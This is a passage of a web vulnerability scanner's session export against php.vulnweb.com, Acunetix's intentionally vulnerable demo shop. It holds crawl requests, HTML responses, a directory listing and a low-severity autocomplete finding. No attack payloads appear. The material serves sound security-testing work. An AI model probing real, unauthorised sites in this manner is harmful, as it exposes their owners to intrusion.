"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>Home of Acunetix Art</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	<h2 id="pageName">welcome to our page</h2>
	  <div class="story">
		<h3>Test site for Acunetix WVS.</h3>
	  </div>
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | <a href="/Mod_Rewrite_Shop/">Shop</a> | <a href="/hpp/">HTTP Parameter Pollution</a> | &copy;2019
  Acunetix Ltd 
</div> 
    
    
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:25 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4958</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="3D5985DD4277DFD81FBEB039CD245CD2"><URL>http://php.vulnweb.com:80/cart.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="d5adf846-7878-4119-a7cb-58cc1d0bb3a5"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="2665" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="3D5985DD4277DFD81FBEB039CD245CD2"><![CDATA[GET /cart.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="3D5985DD4277DFD81FBEB039CD245CD2";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="56";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="11db0d38";
X-Request-Memo: ID="a9756193";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:26 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4903

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>you cart</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
			<h2 id='pageName'>Error</h2>
			  <div class='story'>
				<p>You are not logged on. To log on please visit our <a href='login.php'>login page</a></p>
			  </div>
			</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="3D5985DD4277DFD81FBEB039CD245CD2"><Method>GET</Method><Path>/</Path><File>cart</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Crawl";SID="3D5985DD4277DFD81FBEB039CD245CD2";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="56";tt="31";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="25";smi="0";sc="1";ID="11db0d38";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="a9756193";sc="1";tid="38";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>you cart</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	
			<h2 id='pageName'>Error</h2>
			  <div class='story'>
				<p>You are not logged on. To log on please visit our <a href='login.php'>login page</a></p>
			  </div>
			</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:26 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4903</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="70BCA63FED6B1B1BE4BC76CD408589F0"><URL>http://php.vulnweb.com:80/images/</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues /><RawRequest id="70BCA63FED6B1B1BE4BC76CD408589F0"><![CDATA[GET /images/ HTTP/1.1
Referer: http://php.vulnweb.com/images/logo.gif
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="70BCA63FED6B1B1BE4BC76CD408589F0";PSID="4445BCFDB68CCB46A5AC2409F975CB68";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="27";tt="11";
X-RequestManager-Memo: sid="45";smi="0";sc="1";ID="be3b7e0c";
X-Request-Memo: ID="161c5db8";sc="1";tid="48";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:26 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html
Content-Length: 377

<html>
<head><title>Index of /images/</title></head>
<body>
<h1>Index of /images/</h1><hr><pre><a href="../">../</a>
<a href="logo.gif">logo.gif</a>                                           11-May-2011 10:27                6660
<a href="remark.gif">remark.gif</a>                                         11-May-2011 10:27                  79
</pre><hr></body>
</html>
]]></RawResponse><Request id="70BCA63FED6B1B1BE4BC76CD408589F0"><Method>GET</Method><Path>/images/</Path><File /><Ext /><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery /><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries /><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/images/logo.gif</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="70BCA63FED6B1B1BE4BC76CD408589F0";PSID="4445BCFDB68CCB46A5AC2409F975CB68";SessionType="PathTruncation";CrawlType="None";AttackType="None";OriginatingEngineID="398bfe9e-1b77-4458-9691-603eea06e341";AttackSequence="0";AttackParamDesc="";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="0";Engine="Path+Truncation";SmartMode="4";tid="27";tt="11";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="45";smi="0";sc="1";ID="be3b7e0c";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="161c5db8";sc="1";tid="48";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<html>
<head><title>Index of /images/</title></head>
<body>
<h1>Index of /images/</h1><hr><pre><a href="../">../</a>
<a href="logo.gif">logo.gif</a>                                           11-May-2011 10:27                6660
<a href="remark.gif">remark.gif</a>                                         11-May-2011 10:27                  79
</pre><hr></body>
</html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:44:26 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html</Value></Header><Header><Name>Content-Length</Name><Value>377</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="1C2302E11CB8EF7DA17F6BF587C55102"><URL>http://php.vulnweb.com:80/artists.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor /><Issues><Issue id="6911b65c-34e2-497d-b721-adda30efbb7d"><CheckTypeID>Best Practices</CheckTypeID><EngineType>11546</EngineType><AttackHTTPRequest /><VulnerabilityID>5597</VulnerabilityID><Severity>0</Severity><Name>Form Auto Complete Active</Name><Classifications><Classification kind="CWE" identifier="CWE-525" href="http://cwe.mitre.org/data/definitions/525.html">CWE-525: Information Exposure Through Browser Caching</Classification><Classification kind="7PK" identifier="Security Features" href="https://vulncat.fortify.com/">Security Features</Classification><Classification kind="7PK Category" identifier="Privacy Violation: Autocomplete" href="https://vulncat.fortify.com/">Privacy Violation: Autocomplete</Classification></Classifications><DetectionSelection><Location offset="3090" length="46" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[Most recent browsers have features that will save form field content entered by users and then automatically complete form entry the next time the fields are encountered. This feature is enabled by default and could leak sensitive information since it is stored on the hard drive of the user. The risk of this issue is greatly increased if users are accessing the application from a shared environment. Recommendations include setting autocomplete to "off" on all your forms.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText /></ReportSection><ReportSection><Name>Execution</Name><SectionText /></ReportSection><ReportSection><Name>Fix</Name><SectionText /></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br /><b>Microsoft:</b><br /><a href="http://msdn.microsoft.com/en-us/library/ms533032(VS.85).aspx#security">Autocomplete Security</a>]]></SectionText></ReportSection></Issue></Issues><RawRequest id="1C2302E11CB8EF7DA17F6BF587C55102"><![CDATA[GET /artists.php HTTP/1.1
Referer: http://php.vulnweb.com/
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Crawl";SID="1C2302E11CB8EF7DA17F6BF587C55102";PSID="DD4E05C8521F7A29194D4BE7487B1CA5";SessionType="Crawl";CrawlType="HTML";AttackType="None";OriginatingEngineID="00000000-0000-0000-0000-000000000000";AttributeName="href";Format="NonRooted";LinkKind="HyperLink";Locations="HtmlNode";Source="ScriptExecution";tid="63";tt="31";
X-RequestManager-Memo: sid="25";smi="0";sc="1";ID="e5f8ad72";
X-Request-Memo: ID="b8d55f39";sc="1";tid="38";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:44:28 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 5328

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>artists</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- here goes headers headers -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

